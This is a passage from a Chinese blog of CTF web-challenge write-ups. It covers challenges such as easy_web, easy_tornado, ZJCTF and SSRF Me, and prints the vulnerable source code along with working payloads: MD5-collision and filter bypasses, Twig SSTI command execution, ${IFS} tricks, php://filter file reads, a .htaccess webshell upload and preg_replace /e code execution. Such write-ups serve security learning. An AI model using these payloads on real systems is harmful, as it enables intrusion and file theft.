class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拿到flag</p>        <h2 id="安洵杯-2019-easy-web"   >          <a href="#安洵杯-2019-easy-web" class="heading-link"><i class="fas fa-link"></i></a><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2>      <p>看看传参，img的内容是被hex编码后再用两次base64编码得到的，解码内容如下</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-26" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-26</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 23.02.28.png)</p><p>尝试将index.php编码传入，得到源码</p><pre class="line-numbers language-php+html" data-language="php+html"><code class="language-php+html">&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);$cmd &#x3D; $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;    die(&quot;xixi～ no flag&quot;);&#125; else &#123;    $txt &#x3D; base64_encode(file_get_contents($file));    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接看关键，md5强相等绕过</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2或a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后就是命令绕过，使用反斜杠绕过cat</p><pre class="line-numbers language-none"><code class="language-none">payload:?cmd&#x3D;ca\t &#x2F;flagPOST:a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h2 id="BJDCTF2020-Cookie-is-so-stable"   >          <a href="#BJDCTF2020-Cookie-is-so-stable" class="heading-link"><i class="fas fa-link"></i></a><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2>      <p>直接测试出SSTI，但是这个渲染框架不是flask的，灰溜溜去看wp，发现是php的twig渲染模版，直接在cookie处放payload即可</p><pre class="line-numbers language-none"><code class="language-none">payload:Cookie: user&#x3D;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h2 id="WUSTCTF2020-朴实无华"   >          <a href="#WUSTCTF2020-朴实无华" class="heading-link"><i class="fas fa-link"></i></a><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2>      <p>robots.txt-&gt;fAke_f1agggg.php-&gt;fl4g.php</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;); error_reporting(0); highlight_file(__file__); &#x2F;&#x2F;level 1 if (isset($_GET[&#39;num&#39;]))&#123;     $num &#x3D; $_GET[&#39;num&#39;];     if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;         echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;     &#125;else&#123;         die(&quot;金钱解决不了穷人的本质问题&quot;);     &#125; &#125;else&#123;     die(&quot;去非洲吧&quot;); &#125; &#x2F;&#x2F;level 2 if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5($md5))        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;    else        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;); &#125;else&#123;     die(&quot;去非洲吧&quot;); &#125; &#x2F;&#x2F;get flag if (isset($_GET[&#39;get_flag&#39;]))&#123;     $get_flag &#x3D; $_GET[&#39;get_flag&#39;];     if(!strstr($get_flag,&quot; &quot;))&#123;         $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);         echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;         system($get_flag);     &#125;else&#123;         die(&quot;快到非洲了&quot;);     &#125; &#125;else&#123;     die(&quot;去非洲吧&quot;); &#125; ?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先intval函数特性</p><pre class="line-numbers language-none"><code class="language-none">intval(&#39;2e4&#39;)&#x3D;2intval(&#39;2e4&#39;+1)&#x3D;20001因为在执行下面的命令时相当于先执行了int(&#39;2e4&#39;)&#x3D;20000再加一所以第一个绕过num&#x3D;2e4即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第二个md5弱相等绕过</p><pre class="line-numbers language-none"><code class="language-none">$md5&#x3D;md5($md5)开头是0e并且md5后也是0e即可0e215962017<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后空格绕过和cat绕过</p><pre class="line-numbers language-none"><code class="language-none">payload:fl4g.php?num&#x3D;2e4&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="护网杯-2018-easy-tornado"   >          <a href="#护网杯-2018-easy-tornado" class="heading-link"><i class="fas fa-link"></i></a><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2>      <p>进去三个文件</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;flag.txt：flag in &#x2F;fllllllllllllag&#x2F;welcome.txt：render&#x2F;hints.txt：md5(cookie_secret+md5(filename))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>点击文件查看链接传参，很明显是文件名和对应的<code>md5(cookie_secret+md5(filename))</code>所以我们需要找到<code>cookie_secret</code>这一变量的值，再看welcome中有render，怀疑是SSTI，更改传参内容，出现error页面，测试SSTI成功</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-28" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.29.11.png)</p><p>在查找tornado获取环境变量在handler.settings中，直接构造</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-28" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.31.47.png)</p><p>在按照hints中内容构造hash即可</p><pre class="line-numbers language-none"><code class="language-none">payload:file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;da1ca88f71d944d0819a420a222fc69c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="MRCTF2020-你传你🐎呢"   >          <a href="#MRCTF2020-你传你🐎呢" class="heading-link"><i class="fas fa-link"></i></a><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2>      <p>Apache解析漏洞</p><pre class="line-numbers language-none"><code class="language-none">#.htaccess&lt;FilesMatch &quot;shell.png&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上传后蚁剑连接即可</p>        <h2 id="BJDCTF2020-ZJCTF，不过如此"   >          <a href="#BJDCTF2020-ZJCTF，不过如此" class="heading-link"><i class="fas fa-link"></i></a><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2>      <p>先看代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//next.php</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造先读取next.php中的内容</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php&amp;text&#x3D;php:&#x2F;&#x2F;inputPOST:I have a dream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//next.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时候要用一个正则的漏洞<span class="exturl"><a class="exturl__link"   href="https://www.cesafe.com/html/6999.html" >Preg_Replace代码执行漏洞解析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>构造出正则内容为</p><p>re=\S*（多次匹配非空字符）</p><p>str=${phpinfo()}</p><p>测试成功</p><p>进而使用getFlag函数执行命令</p><pre class="line-numbers language-none"><code class="language-none">payload:next.php?\S*&#x3D;&#123;$&#123;getFlag()&#125;&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="De1CTF-2019-SSRF-Me"   >          <a href="#De1CTF-2019-SSRF-Me" class="heading-link"><i class="fas fa-link"></i></a><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2>      <p>上来就是代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span><span class="token comment"># #encoding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> resp                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span> <span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token 